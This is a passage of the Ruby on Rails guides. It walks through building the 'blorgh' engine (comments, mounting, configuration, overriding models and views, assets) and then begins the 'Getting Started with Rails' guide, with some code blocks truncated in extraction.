This can be made to happen if<n>this line is inserted into the `config/routes.rb` file inside the engine:
root to: "articles#index"
Now people will only need to go to the root of the engine to see all the articles,<n>rather than visiting `/articles`. 
This means that instead of<n>`http://localhost:3000/blorgh/articles`, you only need to go to<n>`http://localhost:3000/blorgh` now.
### Generating a Comments Resource
Now that the engine can create new articles, it only makes sense to add<n>commenting functionality as well. 
To do this, you'll need to generate a comment<n>model, a comment controller and then modify the articles scaffold to display<n>comments and allow people to create new ones.
From the application root, run the model generator. 
Tell it to generate a<n>`Comment` model, with the related table having two columns: a `article_id` integer<n>and `text` text column.
$ bin/rails generate model Comment article_id:integer text:text
This will output the following:
create    db/migrate/[timestamp]_create_blorgh_comments.rb
create    app/models/blorgh/comment.rb
invoke    test_unit
create      test/models/blorgh/comment_test.rb
create      test/fixtures/blorgh/comments.yml
This generator call will generate just the necessary model files it needs,<n>namespacing the files under a `blorgh` directory and creating a model class<n>called `Blorgh::Comment`. 
Now run the migration to create our blorgh_comments<n>table:
$ rake db:migrate
To show the comments on an article, edit `app/views/blorgh/articles/show.html.erb` and<n>add this line before the "Edit" link:
<h3>Comments</h3>
<%= render @article.comments %>
This line will require there to be a `has_many` association for comments defined<n>on the `Blorgh::Article` model, which there isn't right now. 
To define one, open<n>`app/models/blorgh/article.rb` and add this line into the model:
has_many :comments
Turning the model into this:
  class Article < ActiveRecord::Base
    has_many :comments
NOTE: Because the `has_many` is defined inside a class that is inside the<n>`Blorgh` module, Rails will know that you want to use the `Blorgh::Comment`<n>model for these objects, so there's no need to specify that using the<n>`:class_name` option here.
Next, there needs to be a form so that comments can be created on an article. 
To<n>add this, put this line underneath the call to `render @article.comments` in<n>`app/views/blorgh/articles/show.html.erb`:
<%= render "blorgh/comments/form" %>
Next, the partial that this line will render needs to exist. 
Create a new<n>directory at `app/views/blorgh/comments` and in it a new file called<n>`_form.html.erb` which has this content to create the required partial:
<h3>New comment</h3>
<%= form_for [@article, @article.comments.build] do |f| %>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
When this form is submitted, it is going to attempt to perform a `POST` request<n>to a route of `/articles/:article_id/comments` within the engine. 
This route doesn't<n>exist at the moment, but can be created by changing the `resources :articles` line<n>inside `config/routes.rb` into these lines:
resources :articles do
This creates a nested route for the comments, which is what the form requires.
The route now exists, but the controller that this route goes to does not. 
To<n>create it, run this command from the application root:
$ bin/rails g controller comments
This will generate the following things:
create  app/controllers/blorgh/comments_controller.rb
create    test/controllers/blorgh/comments_controller_test.rb
invoke  helper
create    app/helpers/blorgh/comments_helper.rb
create      app/assets/javascripts/blorgh/comments.js
create      app/assets/stylesheets/blorgh/comments.css
The form will be making a `POST` request to `/articles/:article_id/comments`, which<n>will correspond with the `create` action in `Blorgh::CommentsController`. 
This<n>action needs to be created, which can be done by putting the following lines<n>inside the class definition in `app/controllers/blorgh/comments_controller.rb`:
def create
  @article = Article.find(params[:article_id])
  @comment = @article.comments.create(comment_params)
  flash[:notice] = "Comment has been created!"
  redirect_to articles_path
private
  def comment_params
    params.require(:comment).permit(:text)
This is the final step required to get the new comment form working. 
Displaying<n>the comments, however, is not quite right yet. 
If you were to create a comment<n>right now, you would see this error:
:formats=>[:html], :locale=>[:en, :en]}. 
Searched in:   *
"/Users/ryan/Sites/side_projects/blorgh/test/dummy/app/views"   *
"/Users/ryan/Sites/side_projects/blorgh/app/views"
The engine is unable to find the partial required for rendering the comments.<n>
Rails looks first in the application's (`test/dummy`) `app/views` directory and<n>then in the engine's `app/views` directory. 
When it can't find it, it will throw<n>this error. 
This partial will be responsible for rendering just the comment text, for now.<n>
Create a new file at `app/views/blorgh/comments/_comment.html.erb` and put this<n>line inside it:
<%= comment_counter + 1 %>. <%= comment.text %>
The `comment_counter` local variable is given to us by the `<%= render<n>@article.comments %>` call, which will define it automatically and increment the<n>counter as it iterates through each comment. 
It's used in this example to<n>display a small number next to each comment when it's created.
That completes the comment function of the blogging engine. 
Now it's time to use<n>it within an application.
Hooking Into an Application
Using an engine within an application is very easy. 
This section covers how to<n>mount the engine into an application and the initial setup required, as well as<n>linking the engine to a `User` class provided by the application to provide<n>ownership for articles and comments within the engine.
### Mounting the Engine
First, the engine needs to be specified inside the application's `Gemfile`. 
If<n>there isn't an application handy to test this out in, generate one using the<n>`rails new` command outside of the engine directory like this:
$ rails new unicorn
Usually, specifying the engine inside the Gemfile would be done by specifying it<n>as a normal, everyday gem.
gem 'devise'
However, because you are developing the `blorgh` engine on your local machine,<n>you will need to specify the `:path` option in your `Gemfile`:
gem 'blorgh', path: "/path/to/blorgh"
Then run `bundle` to install the gem.
As described earlier, by placing the gem in the `Gemfile` it will be loaded when<n>Rails is loaded. 
It will first require `lib/blorgh.rb` from the engine, then<n>`lib/blorgh/engine.rb`, which is the file that defines the major pieces of<n>functionality for the engine.
To make the engine's functionality accessible from within an application, it<n>needs to be mounted in that application's `config/routes.rb` file:
mount Blorgh::Engine, at: "/blog"
This line will mount the engine at `/blog` in the application. 
Making it<n>accessible at `http://localhost:3000/blog` when the application runs with `rails<n>server`.
NOTE: Other engines, such as Devise, handle this a little differently by making<n>you specify custom helpers (such as `devise_for`) in the routes. 
These helpers<n>do exactly the same thing, mounting pieces of the engines's functionality at a<n>pre-defined path which may be customizable.
### Engine setup
The engine contains migrations for the `blorgh_articles` and `blorgh_comments`<n>table which need to be created in the application's database so that the<n>engine's models can query them correctly. 
To copy these migrations into the<n>application use this command:
$ rake blorgh:install:migrations
If you have multiple engines that need migrations copied over, use<n>`railties:install:migrations` instead:
$ rake railties:install:migrations
This command, when run for the first time, will copy over all the migrations<n>from the engine. 
When run the next time, it will only copy over migrations that<n>haven't been copied over already. 
The first run for this command will output<n>something such as this:
The first timestamp (`[timestamp_1]`) will be the current time, and the second<n>timestamp (`[timestamp_2]`) will be the current time plus a second. 
The reason<n>for this is so that the migrations for the engine are run after any existing<n>migrations in the application.
To run these migrations within the context of the application, simply run `rake<n>db:migrate`. 
When accessing the engine through `http://localhost:3000/blog`, the<n>articles will be empty. 
This is because the table created inside the application is<n>different from the one created within the engine. 
Go ahead, play around with the<n>newly mounted engine. 
You'll find that it's the same as when it was only an<n>engine.
If you would like to run migrations only from one engine, you can do it by<n>specifying `SCOPE`:
rake db:migrate SCOPE=blorgh
This may be useful if you want to revert engine's migrations before removing it.<n>
To revert all migrations from blorgh engine you can run code such as:
rake db:migrate SCOPE=blorgh VERSION=0
### Using a Class Provided by the Application
#### Using a Model Provided by the Application
When an engine is created, it may want to use specific classes from an<n>application to provide links between the pieces of the engine and the pieces of<n>the application. 
In the case of the `blorgh` engine, making articles and comments<n>have authors would make a lot of sense.
A typical application might have a `User` class that would be used to represent<n>authors for an article or a comment. 
But there could be a case where the<n>application calls this class something different, such as `Person`. 
For this<n>reason, the engine should not hardcode associations specifically for a `User`<n>class.
To keep it simple in this case, the application will have a class called `User`<n>that represents the users of the application (we'll get into making this<n>configurable further on). 
It can be generated using this command inside the<n>application:
rails g model user name:string
The `rake db:migrate` command needs to be run here to ensure that our<n>application has the `users` table for future use.
Also, to keep it simple, the articles form will have a new text field called<n>`author_name`, where users can elect to put their name. 
The engine will then<n>take this name and either create a new `User` object from it, or find one that<n>already has that name. 
The engine will then associate the article with the found or<n>created `User` object.
First, the `author_name` text field needs to be added to the<n>`app/views/blorgh/articles/_form.html.erb` partial inside the engine. 
This can be<n>added above the `title` field with this code:
<div class="field">
  <%= f.label :author_name %><br>
  <%= f.text_field :author_name %>
Next, we need to update our `Blorgh::ArticleController#article_params` method to<n>permit the new form parameter:
def article_params
  params.require(:article).permit(:title, :text, :author_name)
The `Blorgh::Article` model should then have some code to convert the `author_name`<n>field into an actual `User` object and associate it as that article's `author`<n>before the article is saved. 
It will also need to have an `attr_accessor` set up<n>for this field, so that the setter and getter methods are defined for it.
To do all this, you'll need to add the `attr_accessor` for `author_name`, the<n>association for the author and the `before_save` call into<n>`app/models/blorgh/article.rb`. 
The `author` association will be hard-coded to the<n>`User` class for the time being.
attr_accessor :author_name
belongs_to :author, class_name: "User"
before_save :set_author
  def set_author
    self.author = User.find_or_create_by(name: author_name)
By representing the `author` association's object with the `User` class, a link<n>is established between the engine and the application. 
There needs to be a way<n>of associating the records in the `blorgh_articles` table with the records in the<n>`users` table. 
Because the association is called `author`, there should be an<n>`author_id` column added to the `blorgh_articles` table.
To generate this new column, run this command within the engine:
$ bin/rails g migration add_author_id_to_blorgh_articles author_id:integer
NOTE: Due to the migration's name and the column specification after it, Rails<n>will automatically know that you want to add a column to a specific table and<n>write that into the migration for you. 
You don't need to tell it any more than<n>this.
This migration will need to be run on the application. 
To do that, it must first<n>be copied using this command:
Notice that only _one_ migration was copied over here. 
This is because the first<n>two migrations were copied over the first time this command was run.
Migration with the same name already exists.<n>
Run the migration using:
Now with all the pieces in place, an action will take place that will associate<n>an author - represented by a record in the `users` table - with an article,<n>represented by the `blorgh_articles` table from the engine.
Finally, the author's name should be displayed on the article's page. 
By outputting `@article.author` using the `<%=` tag, the `to_s` method will be<n>called on the object. 
By default, this will look quite ugly:
Now instead of the ugly Ruby object output, the author's name will be displayed.
#### Using a Controller Provided by the Application
Because Rails controllers generally share code for things like authentication<n>and accessing session variables, they inherit from `ApplicationController` by<n>default. 
Rails engines, however are scoped to run independently from the main<n>application, so each engine gets a scoped `ApplicationController`. 
This<n>namespace prevents code collisions, but often engine controllers need to access<n>methods in the main application's `ApplicationController`. 
An easy way to<n>provide this access is to change the engine's scoped `ApplicationController` to<n>inherit from the main application's `ApplicationController`. 
For our Blorgh<n>engine this would be done by changing<n>`app/controllers/blorgh/application_controller.rb` to look like:
  end
By default, the engine's controllers inherit from<n>`Blorgh::ApplicationController`. 
So, after making this change they will have<n>access to the main application's `ApplicationController`, as though they were<n>part of the main application.
This change does require that the engine is run from a Rails application that<n>has an `ApplicationController`.
### Configuring an Engine
This section covers how to make the `User` class configurable, followed by<n>general configuration tips for the engine.
#### Setting Configuration Settings in the Application
The next step is to make the class that represents a `User` in the application<n>customizable for the engine. 
This is because that class may not always be<n>`User`, as previously explained. 
To make this setting customizable, the engine<n>will have a configuration setting called `author_class` that will be used to<n>specify which class represents users inside the application.
To define this configuration setting, you should use a `mattr_accessor` inside<n>the `Blorgh` module for the engine. 
Add this line to `lib/blorgh.rb` inside the<n>engine:
mattr_accessor :author_class
This method works like its brothers, `attr_accessor` and `cattr_accessor`, but<n>provides a setter and getter method on the module with the specified name. 
To<n>use it, it must be referenced using `Blorgh.author_class`.
The next step is to switch the `Blorgh::Article` model over to this new setting.<n>
Change the `belongs_to` association inside this model<n>(`app/models/blorgh/article.rb`) to this:
belongs_to :author, class_name: Blorgh.author_class
The `set_author` method in the `Blorgh::Article` model should also use this class:
self.author = Blorgh.author_class.constantize.find_or_create_by(name: author_name)
To save having to call `constantize` on the `author_class` result all the time,<n>you could instead just override the `author_class` getter method inside the<n>`Blorgh` module in the `lib/blorgh.rb` file to always call `constantize` on the<n>saved value before returning the result:
def self.author_class
  @@author_class.constantize
This would then turn the above code for `set_author` into this:
self.author = Blorgh.author_class.find_or_create_by(name: author_name)
Resulting in something a little shorter, and more implicit in its behavior. 
The<n>`author_class` method should always return a `Class` object.
Since we changed the `author_class` method to return a `Class` instead of a<n>`String`, we must also modify our `belongs_to` definition in the `Blorgh::Article`
belongs_to :author, class_name: Blorgh.author_class.to_s
To set this configuration setting within the application, an initializer should<n>be used. 
By using an initializer, the configuration will be set up before the<n>application starts and calls the engine's models, which may depend on this<n>configuration setting existing.
Create a new initializer at `config/initializers/blorgh.rb` inside the<n>application where the `blorgh` engine is installed and put this content in it:
WARNING: It's very important here to use the `String` version of the class,<n>rather than the class itself. 
If you were to use the class, Rails would attempt<n>to load that class and then reference the related table. 
This could lead to<n>problems if the table wasn't already existing. 
Therefore, a `String` should be<n>used and then converted to a class using `constantize` in the engine later on.
Go ahead and try to create a new article. 
You will see that it works exactly in the<n>same way as before, except this time the engine is using the configuration<n>setting in `config/initializers/blorgh.rb` to learn what the class is.
There are now no strict dependencies on what the class is, only what the API for<n>the class must be. 
The engine simply requires this class to define a<n>`find_or_create_by` method which returns an object of that class, to be<n>associated with an article when it's created. 
This object, of course, should have<n>some sort of identifier by which it can be referenced.
#### General Engine Configuration
Within an engine, there may come a time where you wish to use things such as<n>initializers, internationalization or other configuration options. 
The great<n>news is that these things are entirely possible, because a Rails engine shares<n>much the same functionality as a Rails application. 
In fact, a Rails<n>application's functionality is actually a superset of what is provided by<n>engines!
If you wish to use an initializer - code that should run before the engine is<n>loaded - the place for it is the `config/initializers` folder. 
This directory's<n>functionality is explained in the [Initializers<n>section](configuring.html#initializers) of the Configuring guide, and works<n>precisely the same way as the `config/initializers` directory inside an<n>application. 
The same thing goes if you want to use a standard initializer.
For locales, simply place the locale files in the `config/locales` directory,<n>just like you would in an application.
Testing an engine
When an engine is generated, there is a smaller dummy application created inside<n>it at `test/dummy`. 
This application is used as a mounting point for the engine,<n>to make testing the engine extremely simple. 
You may extend this application by<n>generating controllers, models or views from within the directory, and then use<n>those to test your engine.
The `test` directory should be treated like a typical Rails testing environment,<n>allowing for unit, functional and integration tests.
### Functional Tests
A matter worth taking into consideration when writing functional tests is that<n>the tests are going to be running on an application - the `test/dummy`<n>application - rather than your engine. 
This is due to the setup of the testing<n>environment; an engine needs an application as a host for testing its main<n>functionality, especially controllers. 
This means that if you were to make a<n>typical `GET` to a controller in a controller's functional test like this:
get :index
      ...
It may not function correctly. 
This is because the application doesn't know how<n>to route these requests to the engine unless you explicitly tell it **how**. 
setup do
      @routes = Engine.routes
This tells the application that you still want to perform a `GET` request to the<n>`index` action of this controller, but you want to use the engine's route to get<n>there, rather than the application's one.
Improving engine functionality
This section explains how to add and/or override engine MVC functionality in the<n>main Rails application.
### Overriding Models and Controllers
Engine model and controller classes can be extended by open classing them in the<n>main Rails application (since model and controller classes are just Ruby classes<n>that inherit Rails specific functionality). 
Open classing an Engine class<n>redefines it for use in the main application. 
This is usually implemented by<n>using the decorator pattern.
For simple class modifications, use `Class#class_eval`. 
For complex class<n>modifications, consider using `ActiveSupport::Concern`.
#### A note on Decorators and Loading Code
Because these decorators are not referenced by your Rails application itself,<n>Rails' autoloading system will not kick in and load your decorators. 
This means<n>that you need to require them yourself.
Here is some sample code to do this:
# lib/blorgh/engine.rb
    config.to_prepare do
      Dir.glob(Rails.root + "app/decorators/**/*_decorator*.rb").each do |c|
        require_dependency(c)
This doesn't apply to just Decorators, but anything that you add in an engine<n>that isn't referenced by your main application.
#### Implementing Decorator Pattern Using Class#class_eval
**Adding** `Article#time_since_created`:
# MyApp/app/decorators/models/blorgh/article_decorator.rb
Blorgh::Article.class_eval do
  def time_since_created
    Time.current - created_at
# Blorgh/app/models/article.rb
**Overriding** `Article#summary`:
  def summary
    "#{title} - #{truncate(text)}"
    "#{title}"
#### Implementing Decorator Pattern Using ActiveSupport::Concern
ActiveSupport::Concern manages load order of interlinked dependent modules and<n>classes at run time allowing you to significantly modularize your code.
**Adding** `Article#time_since_created` and **Overriding** `Article#summary`:
# MyApp/app/models/blorgh/article.rb
class Blorgh::Article < ActiveRecord::Base
  include Blorgh::Concerns::Models::Article
# Blorgh/lib/concerns/models/article
module Blorgh::Concerns::Models::Article
  extend ActiveSupport::Concern
  # 'included do' causes the included code to be evaluated in the
  # context where it is included (article.rb), rather than being
  # executed in the module's context (blorgh/concerns/models/article).
  included do
    attr_accessor :author_name
    belongs_to :author, class_name: "User"
    before_save :set_author
    private
      def set_author
        self.author = User.find_or_create_by(name: author_name)
  module ClassMethods
    def some_class_method
      'some class method string'
### Overriding Views
When Rails looks for a view to render, it will first look in the `app/views`<n>directory of the application. 
If it cannot find the view there, it will check in<n>the `app/views` directories of all engines that have this directory.
When the application is asked to render the view for `Blorgh::ArticlesController`'s<n>index action, it will first look for the path<n>`app/views/blorgh/articles/index.html.erb` within the application. 
If it cannot<n>find it, it will look inside the engine.
You can override this view in the application by simply creating a new file at<n>`app/views/blorgh/articles/index.html.erb`. 
Then you can completely change what<n>this view would normally output.
Try this now by creating a new file at `app/views/blorgh/articles/index.html.erb`<n>and put this content in it:
<h1>Articles</h1>
<%= link_to "New Article", new_article_path %>
<% @articles.each do |article| %>
  <h2><%= article.title %></h2>
  <small>By <%= article.author %></small>
  <%= simple_format(article.text) %>
  <hr>
### Routes
Routes inside an engine are isolated from the application by default. 
This is<n>done by the `isolate_namespace` call inside the `Engine` class. 
This essentially<n>means that the application and its engines can have identically named routes and<n>they will not clash.
Routes inside an engine are drawn on the `Engine` class within<n>`config/routes.rb`, like this:
By having isolated routes such as this, if you wish to link to an area of an<n>engine from within an application, you will need to use the engine's routing<n>proxy method. 
Calls to normal routing methods such as `articles_path` may end up<n>going to undesired locations if both the application and the engine have such a<n>helper defined.
For instance, the following example would go to the application's `articles_path`<n>if that template was rendered from the application, or the engine's `articles_path`<n>if it was rendered from the engine:
<%= link_to "Blog articles", articles_path %>
To make this route always use the engine's `articles_path` routing helper method,<n>we must call the method on the routing proxy method that shares the same name as<n>the engine.
<%= link_to "Blog articles", blorgh.articles_path %>
If you wish to reference the application inside the engine in a similar way, use<n>the `main_app` helper:
<%= link_to "Home", main_app.root_path %>
If you were to use this inside an engine, it would **always** go to the<n>application's root. 
If you were to leave off the `main_app` "routing proxy"<n>method call, it could potentially go to the engine's or application's root,<n>depending on where it was called from.
If a template rendered from within an engine attempts to use one of the<n>application's routing helper methods, it may result in an undefined method call.<n>
If you encounter such an issue, ensure that you're not attempting to call the<n>application's routing methods without the `main_app` prefix from within the<n>engine.
### Assets
Assets within an engine work in an identical way to a full application. 
Like all of the other components of an engine, the assets should be namespaced.<n>
This means that if you have an asset called `style.css`, it should be placed at<n>`app/assets/stylesheets/[engine name]/style.css`, rather than<n>`app/assets/stylesheets/style.css`. 
If this asset isn't namespaced, there is a<n>possibility that the host application could have an asset named identically, in<n>which case the application's asset would take precedence and the engine's one<n>would be ignored.
Imagine that you did have an asset located at<n>`app/assets/stylesheets/blorgh/style.css` To include this asset inside an<n>application, just use `stylesheet_link_tag` and reference the asset as if it<n>were inside the engine:
<%= stylesheet_link_tag "blorgh/style.css" %>
You can also specify these assets as dependencies of other assets using Asset<n>Pipeline require statements in processed files:
INFO. Remember that in order to use languages like Sass or CoffeeScript, you<n>should add the relevant library to your engine's `.gemspec`.
### Separate Assets & Precompiling
There are some situations where your engine's assets are not required by the<n>host application. 
For example, say that you've created an admin functionality<n>that only exists for your engine. 
In this case, the host application doesn't<n>need to require `admin.css` or `admin.js`. 
Only the gem's admin layout needs<n>these assets. 
It doesn't make sense for the host app to include<n>`"blorgh/admin.css"` in its stylesheets. 
In this situation, you should<n>explicitly define these assets for precompilation.  
This tells sprockets to add<n>your engine assets when `rake assets:precompile` is triggered.
You can define assets for precompilation in `engine.rb`:
initializer "blorgh.assets.precompile" do |app|
  app.config.assets.precompile += %w(admin.css admin.js)
For more information, read the [Asset Pipeline guide](asset_pipeline.html).
### Other Gem Dependencies
Gem dependencies inside an engine should be specified inside the `.gemspec` file<n>at the root of the engine. 
The reason is that the engine may be installed as a<n>gem. 
If dependencies were to be specified inside the `Gemfile`, these would not<n>be recognized by a traditional gem install and so they would not be installed,<n>causing the engine to malfunction.
To specify a dependency that should be installed with the engine during a<n>traditional `gem install`, specify it inside the `Gem::Specification` block<n>inside the `.gemspec` file in the engine:
s.add_dependency "moo"
To specify a dependency that should only be installed as a development<n>dependency of the application, specify it like this:
s.add_development_dependency "moo"
Both kinds of dependencies will be installed when `bundle install` is run inside<n>of the application. 
The development dependencies for the gem will only be used<n>when the tests for the engine are running.
Note that if you want to immediately require dependencies when the engine is<n>required, you should require them before the engine's initialization. 
For<n>example:
require 'other_engine/engine'
require 'yet_another_engine/engine'
module MyEngine
Getting Started with Rails<n>==========================<n><n>
This guide covers getting up and running with Ruby on Rails.
* How to install Rails, create a new Rails application, and connect your<n>  application to a database.
* The general layout of a Rails application.
* The basic principles of MVC (Model, View, Controller) and RESTful design.
* How to quickly generate the starting pieces of a Rails application.
Guide Assumptions
This guide is designed for beginners who want to get started with a Rails<n>application from scratch. 
It does not assume that you have any prior experience<n>with Rails. 
However, to get the most out of it, you need to have some<n>prerequisites installed:
To learn more about RubyGems, please read the [RubyGems Guides](http://guides.rubygems.org).
Rails is a web application framework running on the Ruby programming language.
If you have no prior experience with Ruby, you will find a very steep learning<n>curve diving straight into Rails. 
There are several curated lists of online resources<n>for learning Ruby:
* [Official Ruby Programming Language website](https://www.ruby-lang.org/en/documentation/)
* [reSRC's List of Free Programming Books](http://resrc.io/list/10/list-of-free-programming-books/#ruby)
Be aware that some resources, while still excellent, cover versions of Ruby as old as<n>1.6, and commonly 1.8, and will not include some syntax that you will see in day-to-day<n>development with Rails.
What is Rails?
Rails is a web application development framework written in the Ruby language.
It is designed to make programming web applications easier by making assumptions<n>about what every developer needs to get started. 
It allows you to write less<n>code while accomplishing more than many other languages and frameworks.
Experienced Rails developers also report that it makes web application<n>development more fun.
Rails is opinionated software. 
It makes the assumption that there is the "best"<n>way to do things, and it's designed to encourage that way - and in some cases to<n>discourage alternatives. 
If you learn "The Rails Way" you'll probably discover a<n>tremendous increase in productivity. 
If you persist in bringing old habits from<n>other languages to your Rails development, and trying to use patterns you<n>learned elsewhere, you may have a less happy experience.
The Rails philosophy includes two major guiding principles:
* **Don't Repeat Yourself:** DRY is a principle of software development which<n>  states that "Every piece of knowledge must have a single, unambiguous, authoritative<n>  representation within a system." 
By not writing the same information over and over<n>  again, our code is more maintainable, more extensible, and less buggy.
* **Convention Over Configuration:** Rails has opinions about the best way to do many<n>  things in a web application, and defaults to this set of conventions, rather than<n>  require that you specify every minutiae through endless configuration files.
Creating a New Rails Project
The best way to use this guide is to follow each step as it happens, no code or<n>step needed to make this example application has been left out, so you can<n>literally follow along step by step.<n><n>
By following along with this guide, you'll create a Rails project called<n>`blog`, a (very) simple weblog. 
Before you can start building the application,<n>you need to make sure that you have Rails itself installed.
TIP: The examples below use `$` to represent your terminal prompt in a UNIX-like OS,<n>though it may have been customized to appear differently. 
If you are using Windows,<n>your prompt will look something like `c:\source_code>`
### Installing Rails
Open up a command line prompt. 
On Mac OS X open Terminal.app, on Windows choose<n>"Run" from your Start menu and type 'cmd.exe'. 
Any commands prefaced with a<n>dollar sign `$` should be run in the command line. 
Verify that you have a<n>current version of Ruby installed:
$ ruby -v
ruby 2.0.0p353
If you don't have Ruby installed have a look at<n>[ruby-lang.org](https://www.ruby-lang.org/en/installation/) for possible ways to<n>install Ruby on your platform.
Many popular UNIX-like OSes ship with an acceptable version of SQLite3. 
Verify that it is correctly installed and in your PATH:
$ sqlite3 --version
The program should report its version.
To install Rails, use the `gem install` command provided by RubyGems:
$ gem install rails
To verify that you have everything installed correctly, you should be able to<n>run the following:
$ rails --version
### Creating the Blog Application
Rails comes with a number of scripts called generators that are designed to make<n>your development life easier by creating everything that's necessary to start<n>working on a particular task. 
One of these is the new application generator,<n>which will provide you with the foundation of a fresh Rails application so that<n>you don't have to write it yourself.
To use this generator, open a terminal, navigate to a directory where you have<n>rights to create files, and type:
$ rails new blog
This will create a Rails application called Blog in a `blog` directory and<n>install the gem dependencies that are already mentioned in `Gemfile` using<n>`bundle install`.
TIP: You can see all of the command line options that the Rails application<n>builder accepts by running `rails new -h`.
After you create the blog application, switch to its folder:
$ cd blog
The `blog` directory has a number of auto-generated files and folders that make<n>up the structure of a Rails application. 
Most of the work in this tutorial will<n>happen in the `app` folder, but here's a basic rundown on the function of each<n>of the files and folders that Rails created by default:
| File/Folder | Purpose |
|app/|Contains the controllers, models, views, helpers, mailers and assets for your application. 
You'll focus on this folder for the remainder of this guide.
|config/|Configure your application's routes, database, and more. 
This is covered in more detail in [Configuring Rails Applications](configuring.html).
|config.ru|Rack configuration for Rack based servers used to start the application.
|db/|Contains your current database schema, as well as the database migrations.
|Gemfile<br>Gemfile.lock|These files allow you to specify what gem dependencies are needed for your Rails application. 
These files are used by the Bundler gem. 
|lib/|Extended modules for your application.
|log/|Application log files.
|public/|The only folder seen by the world as-is. 
Contains static files and compiled assets.
|Rakefile|This file locates and loads tasks that can be run from the command line. 
The task definitions are defined throughout the components of Rails. 
Rather than changing Rakefile, you should add your own tasks by adding files to the lib/tasks directory of your application.
|README.rdoc|This is a brief instruction manual for your application. 
You should edit this file to tell others what your application does, how to set it up, and so on.
|test/|Unit tests, fixtures, and other test apparatus. 
These are covered in [Testing Rails Applications](testing.html).
|tmp/|Temporary files (like cache, pid, and session files).
|vendor/|A place for all third-party code. 
In a typical Rails application this includes vendored gems.
Hello, Rails!
To begin with, let's get some text up on screen quickly. 
To do this, you need to<n>get your Rails application server running.
### Starting up the Web Server
You actually have a functional Rails application already. 
To see it, you need to<n>start a web server on your development machine. 
You can do this by running the<n>following in the `blog` directory:
Usually Mac OS X and Windows come with a JavaScript runtime installed.<n>
Rails adds the `therubyracer` gem to the generated `Gemfile` in a<n>commented line for new apps and you can uncomment if you need it.<n>
`therubyrhino` is the recommended runtime for JRuby users and is added by<n>default to the `Gemfile` in apps generated under JRuby. 
This will fire up WEBrick, a web server distributed with Ruby by default. 
To see<n>your application in action, open a browser window and navigate to<n><http://localhost:3000>. 
You should see the Rails default information page:
Welcome aboard screenshot](images/getting_started/rails_welcome.png)
TIP: To stop the web server, hit Ctrl+C in the terminal window where it's<n>running. 
To verify the server has stopped you should see your command prompt<n>cursor again. 
For most UNIX-like systems including Mac OS X this will be a<n>dollar sign `$`. 
In development mode, Rails does not generally require you to<n>restart the server; changes you make in files will be automatically picked up by<n>the server.
The "Welcome aboard" page is the _smoke test_ for a new Rails application: it<n>makes sure that you have your software configured correctly enough to serve a<n>page. 
You can also click on the _About your application's environment_ link to<n>see a summary of your application's environment.
### Say "Hello", Rails
To get Rails saying "Hello", you need to create at minimum a _controller_ and a<n>_view_.
A controller's purpose is to receive specific requests for the application.<n>
_Routing_ decides which controller receives which requests. 
Often, there is more<n>than one route to each controller, and different routes can be served by<n>different _actions_. 
Each action's purpose is to collect information to provide<n>it to a view.
A view's purpose is to display this information in a human readable format. 
An<n>important distinction to make is that it is the _controller_, not the view,<n>where information is collected. 
The view should just display that information.<n>
By default, view templates are written in a language called eRuby (Embedded<n>Ruby) which is processed by the request cycle in Rails before being sent to the<n>user.
To create a new controller, you will need to run the "controller" generator and<n>tell it you want a controller called "welcome" with an action called "index",<n>just like this:
Rails will create several files and a route for you.
create  app/controllers/welcome_controller.rb
  get 'welcome/index'
create    app/views/welcome
create    app/views/welcome/index.html.erb
create    test/controllers/welcome_controller_test.rb
create    app/helpers/welcome_helper.rb
invoke    coffee
create      app/assets/javascripts/welcome.js.coffee
invoke    scss
create      app/assets/stylesheets/welcome.css.scss
Most important of these are of course the controller, located at<n>`app/controllers/welcome_controller.rb` and the view, located at<n>`app/views/welcome/index.html.erb`.
Open the `app/views/welcome/index.html.erb` file in your text editor. 
Delete all<n>of the existing code in the file, and replace it with the following single line<n>of code:
<h1>Hello, Rails!
### Setting the Application Home Page
Now that we have made the controller and view, we need to tell Rails when we<n>want "Hello, Rails!" to show up. 
In our case, we want it to show up when we<n>navigate to the root URL of our site, <http://localhost:3000>. 
At the moment,<n>"Welcome aboard" is occupying that spot.
Next, you have to tell Rails where your actual home page is located.
Open the file `config/routes.rb` in your editor.
  # The priority is based upon order of creation:
  # first created -> highest priority.
<n>  #<n>
  # You can have the root of your site routed with "root"
  # root 'welcome#index'
This is your application's _routing file_ which holds entries in a special DSL<n>(domain-specific language) that tells Rails how to connect incoming requests to<n>controllers and actions. 
This file contains many sample routes on commented<n>lines, and one of them actually shows you how to connect the root of your site<n>to a specific controller and action. 
Find the line beginning with `root` and<n>uncomment it. 
It should look something like the following:
root 'welcome#index'
`root 'welcome#index'` tells Rails to map requests to the root of the<n>application to the welcome controller's index action and `get 'welcome/index'`<n>tells Rails to map requests to <http://localhost:3000/welcome/index> to the<n>welcome controller's index action. 
You'll see the<n>"Hello, Rails!" message you put into `app/views/welcome/index.html.erb`,<n>indicating that this new route is indeed going to `WelcomeController`'s `index`<n>action and is rendering the view correctly.
TIP: For more information about routing, refer to [Rails Routing from the Outside In](routing.html).
Getting Up and Running
Now that you've seen how to create a controller, an action and a view, let's<n>create something with a bit more substance.
In the Blog application, you will now create a new _resource_. 
A resource is the<n>term used for a collection of similar objects, such as articles, people or<n>animals.
You can create, read, update and destroy items for a resource and these<n>operations are referred to as _CRUD_ operations.
Rails provides a `resources` method which can be used to declare a standard REST<n>resource. 
  root 'welcome#index'
The meaning of the prefix column (and other columns)<n>will be seen later, but for now notice that Rails has inferred the<n>singular form `article` and makes meaningful use of the distinction.
      Prefix Verb   URI Pattern                  Controller#Action
    articles GET    /articles(.:format)          articles#index
             POST   /articles(.:format)          articles#create
edit_article GET    /articles/:id/edit(.:format) articles#edit
     article GET    /articles/:id(.:format)      articles#show
             PATCH  /articles/:id(.:format)      articles#update
             PUT    /articles/:id(.:format)      articles#update
             DELETE /articles/:id(.:format)      articles#destroy
        root GET    /                            welcome#index
In the next section, you will add the ability to create new articles in your<n>application and be able to view them. 
This is the "C" and the "R" from CRUD:<n>creation and reading. 
The form for doing this will look like this:
The new article form](images/getting_started/new_article.png)
It will look a little basic for now, but that's ok. 
We'll look at improving the<n>styling for it afterwards.
### Laying down the ground work
Firstly, you need a place within the application to create a new article. 
A<n>great place for that would be at `/articles/new`. 
With the route already<n>defined, requests can now be made to `/articles/new` in the application.<n>
Navigate to <http://localhost:3000/articles/new> and you'll see a routing<n>error:
Another routing error, uninitialized constant ArticlesController](images/getting_started/routing_error_no_controller.png)
This error occurs because the route needs to have a controller defined in order<n>to serve the request. 
The solution to this particular problem is simple: create<n>a controller called `ArticlesController`. 
You can do this by running this<n>command:
